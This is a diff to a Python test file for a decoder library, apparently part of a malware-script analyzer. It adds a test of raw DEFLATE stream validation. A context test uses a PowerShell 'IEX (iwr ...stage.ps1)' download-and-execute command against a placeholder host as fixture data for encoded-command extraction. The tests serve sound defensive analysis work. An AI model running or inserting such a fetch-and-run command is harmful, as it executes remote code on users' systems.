@@ -31,6 +31,29 @@ def test_raw_deflate_round_trip_and_output_bound():
     assert RawDeflateDecoder(max_output=8).decode(encoded) == (encoded, False)
 
 
+def test_raw_deflate_rejects_input_that_is_not_one_complete_stream():
+    decoder = RawDeflateDecoder()
+    # Ordinary JSON text whose first bytes coincidentally form a complete
+    # DEFLATE stream must not "decode": the remaining bytes land in
+    # unused_data and prove the match was accidental.
+    metadata = (
+        b'{\n  "analyzer": "script",\n  "deobfuscated_artifacts": [\n'
+        b'    "powershell_decoded.txt"\n  ],\n  "execution_performed": false,\n'
+        b'  "features": [\n    "obfuscation"\n  ],\n  "languages": [\n'
+        b'    "powershell"\n  ]\n}'
+    )
+    assert decoder.can_decode(metadata) is False
+    assert decoder.decode(metadata) == (metadata, False)
+    # A genuine stream followed by trailing bytes is rejected for the same
+    # reason, while the bare stream still decodes.
+    compressor = zlib.compressobj(wbits=-zlib.MAX_WBITS)
+    encoded = compressor.compress(b"payload http://deflate.example/b")
+    encoded += compressor.flush()
+    assert decoder.decode(encoded) == (b"payload http://deflate.example/b", True)
+    padded = encoded + b"trailing"
+    assert decoder.decode(padded) == (padded, False)
+
+
 def test_powershell_encoded_command_extracts_utf16le():
     command = "IEX (iwr 'http://powershell.example/stage.ps1')"
     encoded = base64.b64encode(command.encode("utf-16-le")).decode("ascii")
